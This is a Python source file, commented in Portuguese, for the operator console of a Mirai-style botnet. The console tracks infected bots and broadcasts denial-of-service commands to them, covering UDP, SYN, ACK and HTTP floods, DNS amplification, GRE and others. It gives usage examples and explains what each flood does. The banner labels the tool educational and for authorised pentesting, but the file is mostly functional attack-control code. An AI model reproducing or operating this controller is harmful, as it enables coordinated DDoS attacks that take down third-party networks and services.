#!/usr/bin/env python3
"""
Cliente CNC (Interface de Comando) - cmd.Cmd síncrono com server asyncio em thread
"""
import cmd
import sys
import threading
import asyncio
import time
import socket
import platform

from cnc.server import run_server, MiraiServer


class MiraiCLI(cmd.Cmd):
    intro = """
╔════════════════════════════════════════════════════════════════╗
║                    Mirai-PTBR - CNC Console                    ║
║              Botnet educacional para pentest autorizado        ║
╠════════════════════════════════════════════════════════════════╣
║  Comandos:                                                     ║
║    Geral:     help | exit | status | sysinfo                   ║
║    Bots:      bot | bot list | bots | bot count                ║
║    Ataque:    attack <tipo> <alvo> <duração>                   ║
║               show attacks | stop attack                       ║
║    Info:      info <tipo> | show options | show tipos          ║
╠════════════════════════════════════════════════════════════════╣
║  Tipos de ataque: udp, syn, ack, http, dns, greip, greeth,     ║
║                    vse, stomp                                  ║
╚════════════════════════════════════════════════════════════════╝
    """
    prompt = '(mirai) '

    def __init__(self, host='0.0.0.0', port=7000, verbose=False, server_instance=None):
        super().__init__()
        self.host = host
        self.port = port
        self.verbose = verbose
        self.server = server_instance
        self.server_thread = None
        self._running = True
        self._start_time = time.time()

    def preloop(self):
        """Inicia o servidor asyncio em uma thread separada (se não foi passado externamente)"""
        if self.server is None:
            self.server_thread = threading.Thread(
                target=self._start_server,
                daemon=True,
                name='AsyncServerThread'
            )
            self.server_thread.start()
            time.sleep(0.5)
        else:
            if self.verbose:
                print("[*] Servidor já iniciado externamente. CLI acoplada.")

    def _start_server(self):
        """Roda o servidor asyncio em seu próprio event loop"""
        loop = asyncio.new_event_loop()
        asyncio.set_event_loop(loop)
        try:
            loop.run_until_complete(run_server(self.host, self.port, self.verbose))
        except Exception as e:
            print(f"\n[!] Erro no servidor: {e}")
        finally:
            loop.close()

    def _get_uptime(self):
        """Retorna tempo de atividade formatado"""
        elapsed = int(time.time() - self._start_time)
        h, r = divmod(elapsed, 3600)
        m, s = divmod(r, 60)
        return f"{h:02d}:{m:02d}:{s:02d}"

    def _get_local_ip(self):
        """Obtém o IP local da máquina"""
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.connect(("8.8.8.8", 80))
            ip = s.getsockname()[0]
            s.close()
            return ip
        except:
            return "127.0.0.1"

    # ═══════════════════════════════════════════════════════════════════
    # COMANDOS GERAIS
    # ═══════════════════════════════════════════════════════════════════

    def do_status(self, arg):
        """Mostra status geral do CNC"""
        print("\n╔══════════════════════════════════════╗")
        print("║         STATUS DO CNC                ║")
        print("╠══════════════════════════════════════╣")
        print(f"║  Host:      {self.host:<22} ║")
        print(f"║  Porta:     {self.port:<22} ║")
        print(f"║  Uptime:    {self._get_uptime():<22} ║")
        if self.server and hasattr(self.server, 'bots'):
            print(f"║  Bots:      {len(self.server.bots):<22} ║")
        print(f"║  Verboso:   {str(self.verbose):<22} ║")
        print("╚══════════════════════════════════════╝")

    def do_sysinfo(self, arg):
        """Mostra informações do sistema hospedeiro"""
        print("\n╔══════════════════════════════════════╗")
        print("║         SISTEMA HOSPEDEIRO           ║")
        print("╠══════════════════════════════════════╣")
        print(f"║  OS:        {platform.system():<22} ║")
        print(f"║  Release:   {platform.release():<22} ║")
        print(f"║  Node:      {platform.node():<22} ║")
        print(f"║  Python:    {platform.python_version():<22} ║")
        print(f"║  IP Local:  {self._get_local_ip():<22} ║")
        print("╚══════════════════════════════════════╝")

    def do_connect(self, arg):
        """Altera host/port do servidor: connect <host> <porta>"""
        if not arg:
            print(f"[*] Conectado atualmente em {self.host}:{self.port}")
            print("    Uso: connect <host> <porta>")
            return
        parts = arg.split()
        if len(parts) >= 1:
            self.host = parts[0]
        if len(parts) >= 2:
            try:
                self.port = int(parts[1])
            except ValueError:
                print("[!] Porta inválida. Use um número.")
                return
        print(f"[*] Configurado para conectar em {self.host}:{self.port}")
        print("    Reinicie o CNC para aplicar as alterações.")

    # ═══════════════════════════════════════════════════════════════════
    # COMANDOS DE BOTS
    # ═══════════════════════════════════════════════════════════════════

    def do_bot(self, arg):
        """Lista todos os bots conectados (alias: bot list)"""
        self.do_bot_list(arg)

    def do_bot_list(self, arg):
        """Lista todos os bots conectados"""
        if self.server and hasattr(self.server, 'bots'):
            bots = self.server.bots
            if not bots:
                print("[!] Nenhum bot conectado.")
                return
            print(f"\n[+] Bots conectados ({len(bots)}):")
            print("-" * 80)
            print(f"  {'ID':<16} {'IP':<20} {'Arquitetura':<14} {'Status':<10} {'Conectado há':<12}")
            print("-" * 80)
            for uid, info in bots.items():
                elapsed = int(time.time() - info.get('connected_at', time.time()))
                h, r = divmod(elapsed, 3600)
                m, s = divmod(r, 60)
                uptime_str = f"{h:02d}:{m:02d}:{s:02d}"
                print(f"  {uid:<16} {info.get('ip', '?'):<20} "
                      f"{info.get('arch', '?'):<14} "
                      f"{info.get('status', 'online'):<10} "
                      f"{uptime_str:<12}")
        else:
            print("[!] Servidor ainda não inicializado. Aguarde...")

    def do_bot_count(self, arg):
        """Mostra o número de bots conectados"""
        self.do_bots(arg)

    def do_bots(self, arg):
        """Mostra contagem de bots conectados"""
        if self.server and hasattr(self.server, 'bots'):
            count = len(self.server.bots)
            print(f"\n[+] Total de bots conectados: {count}")
            if count > 0:
                arquiteturas = {}
                for info in self.server.bots.values():
                    arch = info.get('arch', 'unknown')
                    arquiteturas[arch] = arquiteturas.get(arch, 0) + 1
                if arquiteturas:
                    print(f"    Arquiteturas: {arquiteturas}")
        else:
            print("[!] Servidor ainda não inicializado. Aguarde...")

    # ═══════════════════════════════════════════════════════════════════
    # COMANDOS DE ATAQUE
    # ═══════════════════════════════════════════════════════════════════

    def do_attack(self, arg):
        """Envia comando de ataque: attack <tipo> <alvo> <duração>"""
        if not arg:
            print("[!] Uso: attack <tipo> <alvo> <duração>")
            print("    Tipos: udp, syn, ack, http, dns, greip, greeth, vse, stomp")
            print("    Ex:   attack syn 192.168.1.1 60")
            return

        parts = arg.split()
        if len(parts) < 3:
            print("[!] Uso: attack <tipo> <alvo> <duração>")
            return

        attack_type, target, duration = parts[0], parts[1], parts[2]

        if self.server and hasattr(self.server, 'bots'):
            from cnc.protocol import AttackCommand, AttackType
            try:
                atype = AttackType[attack_type.upper()]
            except KeyError:
                print(f"[!] Tipo de ataque inválido: {attack_type}")
                print("    Tipos válidos:", ', '.join(t.name.lower() for t in AttackType))
                return

            cmd = AttackCommand(
                attack_type=atype,
                target=target,
                duration=int(duration),
                bot_id=None  # broadcast para todos
            )

            loop = getattr(self.server, 'loop', None)
            if loop and loop.is_running():
                asyncio.run_coroutine_threadsafe(
                    self.server.broadcast(cmd.to_bytes()),
                    loop
                )
                print(f"[+] Ataque {attack_type} enviado para {target} "
                      f"por {duration}s (broadcast)")
            else:
                print("[!] Servidor asyncio não está rodando.")
        else:
            print("[!] Servidor ainda não inicializado. Aguarde...")

    def do_stop(self, arg):
        """Para o servidor CNC ou um ataque específico"""
        if arg and arg.lower() == 'attack':
            print("[*] Parando todos os ataques ativos...")
            loop = getattr(self.server, 'loop', None)
            if loop and loop.is_running() and hasattr(self.server, 'attack_mgr'):
                asyncio.run_coroutine_threadsafe(
                    self.server.attack_mgr.stop_all(),
                    loop
                )
            else:
                print("[*] Nenhum ataque ativo para parar.")
            return

        # Para o servidor CNC
        print("[*] Parando servidor CNC...")
        loop = getattr(self.server, 'loop', None)
        if loop and loop.is_running():
            loop.call_soon_threadsafe(loop.stop)
        self._running = False
        return True

    # ═══════════════════════════════════════════════════════════════════
    # COMANDOS DE INFO/SHOW
    # ═══════════════════════════════════════════════════════════════════

    def do_info(self, arg):
        """Mostra informações detalhadas sobre um tipo de ataque ou bot"""
        if not arg:
            print("[!] Uso: info <tipo>")
            print("    info udp       - Detalhes do ataque UDP")
            print("    info bot <id>  - Detalhes de um bot específico")
            return

        parts = arg.split()
        topic = parts[0].lower()

        if topic == 'udp':
            print("""
╔══════════════════════════════════════════════════════════════╗
║  UDP Flood                                                   ║
╠══════════════════════════════════════════════════════════════╣
║  Inunda o alvo com pacotes UDP em portas aleatórias.         ║
║  Consome banda e recursos de processamento do alvo.          ║
║                                                              ║
║  Parâmetros: alvo (IP), duração (segundos)                   ║
║  Uso: attack udp <IP> <duração>                              ║
╚══════════════════════════════════════════════════════════════╝
            """)
        elif topic == 'syn':
            print("""
╔══════════════════════════════════════════════════════════════╗
║  SYN Flood                                                   ║
╠══════════════════════════════════════════════════════════════╣
║  Envia pacotes TCP SYN para consumir conexões do alvo.       ║
║  Esgota a tabela de conexões do servidor alvo.               ║
║                                                              ║
║  Parâmetros: alvo (IP), duração (segundos)                   ║
║  Uso: attack syn <IP> <duração>                              ║
╚══════════════════════════════════════════════════════════════╝
            """)
        elif topic == 'ack':
            print("""
╔══════════════════════════════════════════════════════════════╗
║  ACK Flood                                                   ║
╠══════════════════════════════════════════════════════════════╣
║  Envia pacotes TCP ACK para sobrecarregar firewalls.         ║
║  Força processamento em firewalls estaduais (stateful).      ║
║                                                              ║
║  Parâmetros: alvo (IP), duração (segundos)                   ║
║  Uso: attack ack <IP> <duração>                              ║
╚══════════════════════════════════════════════════════════════╝
            """)
        elif topic == 'http':
            print("""
╔══════════════════════════════════════════════════════════════╗
║  HTTP Flood                                                  ║
╠══════════════════════════════════════════════════════════════╣
║  Inunda o alvo com requisições HTTP GET/POST legítimas.      ║
║  Consome recursos do servidor web (CPU, conexões, I/O).      ║
║                                                              ║
║  Parâmetros: alvo (URL/IP), duração (segundos)               ║
║  Uso: attack http <URL> <duração>                            ║
╚══════════════════════════════════════════════════════════════╝
            """)
        elif topic == 'dns':
            print("""
╔══════════════════════════════════════════════════════════════╗
║  DNS Amplification                                           ║
╠══════════════════════════════════════════════════════════════╣
║  Envia queries DNS falsificadas para amplificar tráfego.     ║
║  Usa servidores DNS abertos como refletores.                 ║
║                                                              ║
║  Parâmetros: alvo (IP), duração (segundos)                   ║
║  Uso: attack dns <IP> <duração>                              ║
╚══════════════════════════════════════════════════════════════╝
            """)
        elif topic == 'bot':
            if len(parts) >= 2:
                bot_id = parts[1]
                if self.server and hasattr(self.server, 'bots'):
                    if bot_id in self.server.bots:
                        info = self.server.bots[bot_id]
                        print(f"\n[+] Informações do Bot: {bot_id}")
                        print("-" * 40)
                        for k, v in info.items():
                            if k != 'writer':
                                print(f"  {k}: {v}")
                    else:
                        print(f"[!] Bot '{bot_id}' não encontrado.")
                else:
                    print("[!] Servidor não inicializado ou sem bots.")
            else:
                print("[!] Uso: info bot <id>")
        else:
            print(f"[!] Info não disponível para '{topic}'")
            print("    Tente: info udp, info syn, info ack, info http, info dns, info bot <id>")

    def do_show(self, arg):
        """Mostra configurações ou informações: show options | show attacks | show tipos"""
        if not arg:
            print("[!] Uso: show <options|attacks|tipos|bots>")
            return

        topic = arg.strip().lower()

        if topic == 'options':
            print("\n╔══════════════════════════════════════╗")
            print("║         OPÇÕES DO CNC                ║")
            print("╠══════════════════════════════════════╣")
            print(f"║  Host:      {self.host:<22}   ║")
            print(f"║  Porta:     {self.port:<22}   ║")
            print(f"║  Verboso:   {str(self.verbose):<22}   ║")
            print(f"║  Server:    {'Ativo' if self.server else 'Parado':<22}   ║")
            if self.server and hasattr(self.server, 'bots'):
                print(f"║  Bots:      {len(self.server.bots):<22}   ║")
            print("╚══════════════════════════════════════╝")

        elif topic == 'attacks':
            print("\n[*] Ataques ativos:")
            if self.server and hasattr(self.server, 'attack_mgr'):
                loop = getattr(self.server, 'loop', None)
                if loop and loop.is_running():
                    future = asyncio.run_coroutine_threadsafe(
                        self.server.attack_mgr.list_active(),
                        loop
                    )
                    try:
                        attacks = future.result(timeout=2)
                        if attacks:
                            for a in attacks:
                                print(f"  ID: {a['id']} | Tipo: {a['type']} | "
                                      f"Decorrido: {a['elapsed']} | Restante: {a['remaining']} | "
                                      f"Bots: {a['bots']}")
                        else:
                            print("  Nenhum ataque ativo no momento.")
                    except Exception:
                        print("  (falha ao consultar ataques)")
                else:
                    print("  Servidor não está rodando.")
            else:
                print("  Gerenciador de ataques não disponível.")

        elif topic == 'tipos':
            print("\n[+] Tipos de ataque disponíveis:")
            from cnc.protocol import AttackType
            for at in AttackType:
                print(f"  {at.name.lower():<12} - {at.value}")

        elif topic == 'bots':
            self.do_bot_list(arg)

        else:
            print(f"[!] Opção desconhecida: {topic}")
            print("    Use: show options | show attacks | show tipos | show bots")

    def do_use(self, arg):
        """Seleciona um módulo/ataque para configurar: use <tipo>"""
        if not arg:
            print("[!] Uso: use <tipo>")
            print("    Tipos: udp, syn, ack, http, dns, greip, greeth, vse, stomp")
            return

        attack_type = arg.strip().lower()
        from cnc.protocol import AttackType
        try:
            atype = AttackType[attack_type.upper()]
            print(f"[*] Usando módulo de ataque: {atype.name.lower()}")
            print("    Configure o ataque com: set target <IP> e set duration <segundos>")
            print("    Depois execute: run")
            # Armazena seleção atual
            self._current_attack_type = atype
            self._current_target = None
            self._current_duration = None
        except KeyError:
            print(f"[!] Tipo de ataque inválido: {attack_type}")

    def do_set(self, arg):
        """Configura parâmetros do ataque: set target <IP> | set duration <segundos>"""
        if not hasattr(self, '_current_attack_type') or self._current_attack_type is None:
            print("[!] Nenhum módulo selecionado. Use 'use <tipo>' primeiro.")
            return

        if not arg:
            print("[!] Uso: set <param> <valor>")
            print("    Parâmetros: target, duration")
            return

        parts = arg.split(None, 1)
        if len(parts) < 2:
            print("[!] Uso: set <param> <valor>")
            return

        param, value = parts[0].lower(), parts[1]

        if param == 'target':
            self._current_target = value
            print(f"[*] target => {value}")
        elif param == 'duration':
            try:
                self._current_duration = int(value)
                print(f"[*] duration => {value}")
            except ValueError:
                print("[!] duration deve ser um número (segundos).")
        else:
            print(f"[!] Parâmetro desconhecido: {param}")
            print("    Parâmetros: target, duration")

    def do_run(self, arg):
        """Executa o ataque configurado com 'use' e 'set'"""
        if not hasattr(self, '_current_attack_type') or self._current_attack_type is None:
            print("[!] Nenhum módulo selecionado. Use 'use <tipo>' primeiro.")
            return

        if not self._current_target:
            print("[!] Target não configurado. Use 'set target <IP>'")
            return

        if not self._current_duration:
            print("[!] Duration não configurada. Use 'set duration <segundos>'")
            return

        # Executa o ataque
        self.do_attack(f"{self._current_attack_type.name.lower()} {self._current_target} {self._current_duration}")

    # ═══════════════════════════════════════════════════════════════════
    # COMANDOS PADRÃO
    # ═══════════════════════════════════════════════════════════════════

    def do_exit(self, arg):
        """Sai do console CNC"""
        self.do_stop(arg)
        print("[*] Saindo do Mirai-PTBR CNC...")
        return True

    def do_help(self, arg):
        """Mostra ajuda detalhada"""
        if arg:
            # Mostra help do comando específico
            super().do_help(arg)
        else:
            print("""
╔══════════════════════════════════════════════════════════════╗
║                   AJUDA - Mirai-PTBR CNC                     ║
╠══════════════════════════════════════════════════════════════╣
║                                                              ║
║  GERAL:                                                      ║
║    status        - Status do servidor CNC                    ║
║    sysinfo       - Informações do sistema hospedeiro         ║
║    connect <h> <p> - Configurar host/porta do CNC            ║
║    help          - Mostra esta ajuda                         ║
║    exit          - Sai do console                            ║
║                                                              ║
║  BOTS:                                                       ║
║    bot list      - Lista bots conectados                     ║
║    bot           - Alias para bot list                       ║
║    bot count     - Contagem de bots                          ║
║    bots          - Alias para bot count                      ║
║    info bot <id> - Info detalhada de um bot                  ║
║                                                              ║
║  ATAQUE:                                                     ║
║    attack <tipo> <alvo> <dur>  - Executar ataque direto      ║
║    use <tipo>                  - Selecionar módulo de ataque ║
║    set target <IP>             - Configurar alvo             ║
║    set duration <seg>          - Configurar duração          ║
║    run                         - Executar ataque configurado ║
║    show attacks                - Mostrar ataques ativos      ║
║    stop attack                 - Parar todos os ataques      ║
║    show tipos                  - Listar tipos de ataque      ║
║    info <tipo>                 - Detalhes do tipo de ataque  ║
║                                                              ║
║  CONFIGURAÇÃO:                                               ║
║    show options  - Mostrar opções atuais do CNC              ║
║    show bots     - Listar bots conectados                    ║
║                                                              ║
║  TIPOS DE ATAQUE: udp, syn, ack, http, dns, greip,           ║
║                   greeth, vse, stomp                         ║
║                                                              ║
║  EXEMPLOS:                                                   ║
║    attack syn 192.168.1.1 60                                 ║
║    use udp                                                   ║
║    set target 10.0.0.5                                       ║
║    set duration 120                                          ║
║    run                                                       ║
║                                                              ║
╚══════════════════════════════════════════════════════════════╝
            """)

    def emptyline(self):
        """Não faz nada em linha vazia"""
        pass

    def postloop(self):
        """Limpeza ao sair"""
        print("[*] Console encerrado.")


def run_cli(host='0.0.0.0', port=7000, verbose=False, server_instance=None):
    """Inicia a interface de linha de comando"""
    MiraiCLI(host=host, port=port, verbose=verbose, server_instance=server_instance).cmdloop()
    
